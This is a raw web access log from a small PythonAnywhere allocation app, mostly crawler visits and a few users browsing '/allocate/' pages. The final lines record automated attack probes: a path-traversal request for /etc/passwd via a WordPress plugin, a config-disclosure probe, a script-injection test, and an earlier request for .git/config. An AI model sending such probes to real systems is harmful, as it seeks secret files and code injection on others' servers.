207.46.13.222 - - [13/Jan/2023:02:33:01 +0000] "GET /robots.txt HTTP/1.1" 404 951 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.222" response-time=0.029
207.46.13.26 - - [13/Jan/2023:02:33:06 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.26" response-time=0.003
216.244.66.201 - - [13/Jan/2023:06:44:20 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" "216.244.66.201" response-time=0.101
216.244.66.201 - - [13/Jan/2023:07:15:51 +0000] "GET /allocate/9over3 HTTP/1.1" 200 6884 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" "216.244.66.201" response-time=0.194
207.46.13.39 - - [13/Jan/2023:08:00:46 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=0.004
207.46.13.26 - - [13/Jan/2023:14:26:53 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.26" response-time=0.122
91.84.212.58 - - [13/Jan/2023:16:01:29 +0000] "GET /allocate HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=6.627
91.84.212.58 - - [13/Jan/2023:16:01:30 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.098
91.84.212.58 - - [13/Jan/2023:16:01:33 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.031
91.84.212.58 - - [13/Jan/2023:16:05:21 +0000] "GET /allocate/160over53 HTTP/1.1" 200 15584 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.242
91.84.212.58 - - [13/Jan/2023:16:32:45 +0000] "GET /allocate/16over5 HTTP/1.1" 200 2034 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.079
91.84.212.58 - - [13/Jan/2023:16:37:07 +0000] "GET /allocate/172over57 HTTP/1.1" 200 18211 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.179
91.84.212.58 - - [13/Jan/2023:16:37:07 +0000] "GET /allocate/172over57 HTTP/1.1" 200 18211 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.128
75.119.152.184 - - [13/Jan/2023:17:18:00 +0000] "GET /allocate/.git/config HTTP/1.1" 404 1116 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "75.119.152.184" response-time=0.026
91.84.212.58 - - [13/Jan/2023:17:42:44 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "http://breakoutroom.pythonanywhere.com/allocate/172over57" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.007
91.84.212.58 - - [13/Jan/2023:17:42:50 +0000] "GET /allocate/28over9 HTTP/1.1" 200 2153 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.091
91.84.212.58 - - [13/Jan/2023:19:31:02 +0000] "GET /allocate/28over9 HTTP/1.1" 200 2153 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.111
91.84.212.58 - - [13/Jan/2023:19:31:22 +0000] "GET /allocate/40over13 HTTP/1.1" 200 2576 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.080
91.84.212.58 - - [13/Jan/2023:19:31:41 +0000] "GET /allocate/40over13 HTTP/1.1" 200 2576 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.082
91.84.212.58 - - [13/Jan/2023:19:32:12 +0000] "GET /allocate/52over17 HTTP/1.1" 200 3137 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.083
91.84.212.58 - - [13/Jan/2023:19:32:53 +0000] "GET /allocate/64over21 HTTP/1.1" 200 3783 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.082
91.84.212.58 - - [13/Jan/2023:19:35:31 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" "91.84.212.58" response-time=0.018
91.84.212.58 - - [13/Jan/2023:19:35:31 +0000] "GET /allocate/download/ HTTP/1.1" 404 1111 "-" "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" "91.84.212.58" response-time=0.007
91.84.212.58 - - [13/Jan/2023:19:36:05 +0000] "GET /allocate/76over25 HTTP/1.1" 200 4767 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.164
91.84.212.58 - - [13/Jan/2023:19:41:56 +0000] "GET /allocate/88over29 HTTP/1.1" 200 5725 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.242
91.84.212.58 - - [13/Jan/2023:19:43:46 +0000] "GET /allocate/100over33 HTTP/1.1" 200 6809 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.111
91.84.212.58 - - [13/Jan/2023:19:44:21 +0000] "GET /allocate/112over37 HTTP/1.1" 200 8396 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.095
91.84.212.58 - - [13/Jan/2023:19:45:18 +0000] "GET /allocate/124over41 HTTP/1.1" 200 9938 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.131
91.84.212.58 - - [13/Jan/2023:19:47:13 +0000] "GET /allocate/136over45 HTTP/1.1" 200 11542 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.133
91.84.212.58 - - [13/Jan/2023:19:48:00 +0000] "GET /allocate/148over49 HTTP/1.1" 200 13891 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.189
91.84.212.58 - - [13/Jan/2023:19:48:27 +0000] "GET /allocate/9over3 HTTP/1.1" 200 1920 "http://breakoutroom.pythonanywhere.com/allocate/148over49" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.077
167.114.158.215 - - [13/Jan/2023:20:45:14 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "167.114.158.215" response-time=0.028
167.114.158.215 - - [13/Jan/2023:20:45:22 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "167.114.158.215" response-time=0.006
66.249.66.33 - - [13/Jan/2023:20:53:25 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.66.33" response-time=0.015
207.46.13.39 - - [13/Jan/2023:21:27:13 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=0.004
31.205.78.58 - - [13/Jan/2023:22:30:21 +0000] "GET /allocate HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.002
31.205.78.58 - - [13/Jan/2023:22:30:22 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.011
31.205.78.58 - - [13/Jan/2023:22:30:22 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.015
91.84.212.58 - - [13/Jan/2023:22:32:50 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.49" "91.84.212.58" response-time=0.018
31.205.78.58 - - [13/Jan/2023:22:32:55 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.004
31.205.78.58 - - [13/Jan/2023:22:33:05 +0000] "GET /allocate/32over3 HTTP/1.1" 200 2812 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.117
31.205.78.58 - - [13/Jan/2023:22:33:32 +0000] "GET /allocate/100over4 HTTP/1.1" 200 27710 "http://breakoutroom.pythonanywhere.com/allocate/32over3" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.192
31.205.78.58 - - [13/Jan/2023:22:33:41 +0000] "GET /allocate/146over5 HTTP/1.1" 200 1390 "http://breakoutroom.pythonanywhere.com/allocate/100over4" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.083
31.205.78.58 - - [13/Jan/2023:22:33:47 +0000] "GET /allocate/122over5 HTTP/1.1" 200 11851 "http://breakoutroom.pythonanywhere.com/allocate/146over5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.113
31.205.78.58 - - [13/Jan/2023:22:33:51 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "http://breakoutroom.pythonanywhere.com/allocate/122over5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "31.205.78.58" response-time=0.003
91.84.212.58 - - [13/Jan/2023:22:53:38 +0000] "GET /allocate/160over53 HTTP/1.1" 200 15584 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.192
91.84.212.58 - - [13/Jan/2023:22:54:05 +0000] "GET /allocate/172over57 HTTP/1.1" 200 18211 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.157
91.84.212.58 - - [13/Jan/2023:22:54:36 +0000] "GET /allocate/184over61 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.077
91.84.212.58 - - [13/Jan/2023:22:54:55 +0000] "GET /allocate/196over65 HTTP/1.1" 200 22390 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.198
91.84.212.58 - - [13/Jan/2023:22:55:26 +0000] "GET /allocate/208over69 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.084
91.84.212.58 - - [13/Jan/2023:22:55:47 +0000] "GET /allocate/220over73 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.086
91.84.212.58 - - [13/Jan/2023:22:56:00 +0000] "GET /allocate/232over77 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.090
91.84.212.58 - - [13/Jan/2023:22:56:45 +0000] "GET /allocate/244over81 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.082
91.84.212.58 - - [13/Jan/2023:22:56:56 +0000] "GET /allocate/256over85 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.077
91.84.212.58 - - [13/Jan/2023:22:57:09 +0000] "GET /allocate/268over89 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.088
91.84.212.58 - - [13/Jan/2023:22:57:24 +0000] "GET /allocate/280over93 HTTP/1.1" 200 1391 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.073
91.84.212.58 - - [13/Jan/2023:22:57:43 +0000] "GET /allocate/400over133 HTTP/1.1" 200 1392 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.074
91.84.212.58 - - [13/Jan/2023:23:01:53 +0000] "GET /allocate/9over4 HTTP/1.1" 200 1919 "http://breakoutroom.pythonanywhere.com/allocate/400over133" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.093
91.84.212.58 - - [13/Jan/2023:23:03:17 +0000] "GET /allocate/201over100 HTTP/1.1" 200 1392 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.101
91.84.212.58 - - [13/Jan/2023:23:03:24 +0000] "GET /favicon.ico HTTP/1.1" 404 952 "https://breakoutroom.pythonanywhere.com/allocate/201over100" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.023
194.187.169.23 - - [14/Jan/2023:01:17:34 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.23" response-time=0.025
207.46.13.26 - - [14/Jan/2023:01:20:04 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.26" response-time=0.002
194.187.169.24 - - [14/Jan/2023:01:24:38 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.24" response-time=0.019
207.46.13.39 - - [14/Jan/2023:06:47:16 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.39" response-time=0.044
91.84.212.58 - - [14/Jan/2023:10:27:50 +0000] "GET /allocate/201over100 HTTP/1.1" 200 1392 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.303
90.255.70.122 - - [14/Jan/2023:10:51:14 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "https://www.google.co.uk/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76" "90.255.70.122" response-time=0.008
90.255.70.122 - - [14/Jan/2023:10:51:15 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "http://breakoutroom.pythonanywhere.com/allocate/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76" "90.255.70.122" response-time=0.059
207.46.13.26 - - [14/Jan/2023:11:08:39 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.26" response-time=0.003
91.84.212.58 - - [14/Jan/2023:12:15:26 +0000] "GET /allocate/201over100 HTTP/1.1" 200 1392 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.142
91.84.212.58 - - [14/Jan/2023:12:15:34 +0000] "GET /allocate/36over7 HTTP/1.1" 200 4166 "https://breakoutroom.pythonanywhere.com/allocate/201over100" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.164
194.187.169.23 - - [14/Jan/2023:16:36:49 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.23" response-time=0.117
194.187.169.23 - - [14/Jan/2023:16:38:37 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.23" response-time=0.021
194.187.169.23 - - [14/Jan/2023:16:39:27 +0000] "GET /robots.txt HTTP/1.1" 404 2199 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.23" response-time=0.011
194.187.169.19 - - [14/Jan/2023:17:10:06 +0000] "GET /allocate/9over3 HTTP/1.1" 200 1920 "-" "Mozilla/5.0 (compatible; Qwantify-dev/1.0; +https://help.qwant.com/bot/)" "194.187.169.19" response-time=0.161
91.84.212.58 - - [14/Jan/2023:17:53:38 +0000] "GET /allocate/36over7 HTTP/1.1" 200 4166 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.114
91.84.212.58 - - [14/Jan/2023:17:53:52 +0000] "GET /allocate/66over7 HTTP/1.1" 200 12363 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.129
91.84.212.58 - - [14/Jan/2023:17:56:45 +0000] "GET /allocate/96over19 HTTP/1.1" 200 23609 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.404
207.46.13.39 - - [14/Jan/2023:20:12:04 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=5.748
91.84.212.58 - - [14/Jan/2023:23:07:10 +0000] "GET /allocate/96over19 HTTP/1.1" 200 23609 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.495
91.84.212.58 - - [14/Jan/2023:23:07:22 +0000] "GET /allocate/85over21 HTTP/1.1" 200 6994 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.096
91.84.212.58 - - [14/Jan/2023:23:10:21 +0000] "GET /allocate/49over8 HTTP/1.1" 200 4622 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.093
40.77.167.68 - - [15/Jan/2023:00:05:15 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "40.77.167.68" response-time=0.002
162.55.85.225 - - [15/Jan/2023:03:00:44 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.079
162.55.85.225 - - [15/Jan/2023:03:00:46 +0000] "GET /sitemap HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.007
162.55.85.225 - - [15/Jan/2023:03:00:48 +0000] "GET /sitemap.txt HTTP/1.1" 404 953 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.016
207.46.13.222 - - [15/Jan/2023:05:32:42 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.222" response-time=0.027
207.46.13.39 - - [15/Jan/2023:05:32:51 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=0.003
91.84.212.58 - - [15/Jan/2023:08:32:19 +0000] "GET /allocate/91over15 HTTP/1.1" 200 17622 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.605
207.46.13.222 - - [15/Jan/2023:08:32:29 +0000] "GET /robots.txt HTTP/1.1" 404 951 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" "207.46.13.222" response-time=0.037
40.77.167.68 - - [15/Jan/2023:08:32:33 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "40.77.167.68" response-time=0.002
91.84.212.58 - - [15/Jan/2023:08:33:36 +0000] "GET /allocate/49over8 HTTP/1.1" 200 4622 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.132
54.36.148.144 - - [15/Jan/2023:15:36:13 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "54.36.148.144" response-time=0.136
207.46.13.39 - - [15/Jan/2023:17:48:10 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "207.46.13.39" response-time=0.037
66.249.66.31 - - [15/Jan/2023:18:16:38 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.66.31" response-time=0.048
66.249.66.209 - - [15/Jan/2023:18:16:38 +0000] "GET /favicon.ico HTTP/1.1" 404 951 "-" "Googlebot-Image/1.0" "66.249.66.209" response-time=0.006
162.55.85.225 - - [15/Jan/2023:19:26:07 +0000] "GET /robots.txt HTTP/1.1" 404 950 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.043
162.55.85.225 - - [15/Jan/2023:19:26:10 +0000] "GET /allocate/ HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)" "162.55.85.225" response-time=0.025
91.84.212.58 - - [15/Jan/2023:23:05:04 +0000] "GET /allocate/49over8 HTTP/1.1" 200 4622 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.376
91.84.212.58 - - [15/Jan/2023:23:05:06 +0000] "GET /favicon.ico HTTP/1.1" 404 952 "https://breakoutroom.pythonanywhere.com/allocate/49over8" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.032
91.84.212.58 - - [15/Jan/2023:23:05:14 +0000] "GET /allocate/64over9 HTTP/1.1" 200 10690 "https://breakoutroom.pythonanywhere.com/allocate/49over8" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "91.84.212.58" response-time=0.154
194.163.182.89 - - [16/Jan/2023:00:49:57 +0000] "GET /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd HTTP/1.1" 404 1003 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36" "194.163.182.89" response-time=0.062
194.163.182.89 - - [16/Jan/2023:00:49:59 +0000] "GET /listconf?command=conf HTTP/1.1" 404 957 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36" "194.163.182.89" response-time=0.054
194.163.182.89 - - [16/Jan/2023:00:50:00 +0000] "GET /%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 404 991 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36" "194.163.182.89" response-time=0.016
